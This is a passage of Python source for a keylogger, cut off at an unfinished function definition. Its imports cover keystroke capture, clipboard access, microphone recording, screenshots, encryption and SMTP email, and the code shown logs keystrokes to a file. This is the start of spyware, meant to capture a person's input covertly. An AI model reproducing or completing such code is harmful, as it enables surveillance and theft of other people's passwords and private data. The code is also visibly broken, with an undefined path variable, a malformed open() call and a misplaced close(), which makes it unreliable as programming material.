# import pywin32 pynput scipy cryptography requests pillow sounddevice

# Libraries

# 1 Email Libraries -

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener  # keystrokes input library

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd  # audio library

from cryptography.fernet import Fernet  # Encryption Library

import getpass
from requests import get  # get usernames and passwords

from multiprocessing import Process, freeze_support  # for one screenshot at a time
from PIL import ImageGrab  # screenshot library


# Default Variables

keys_information = "key_log.txt"
path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file

count = 0
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1


def write_file(keys):
    with open(file_path, extend, keys_information, "a") as f:
        for key in keys:
            # it will remove the single quotes from the key so the key becomes readable
            k = str(key).replace("'", "")
            if k.find("space") > 0:  # it will find the space in the key
                f.write('\n')
                f.close()


def on_release(key):
    if key == Key.esc:  # if the key is escape button then it will stop the keylogger
        return False


def
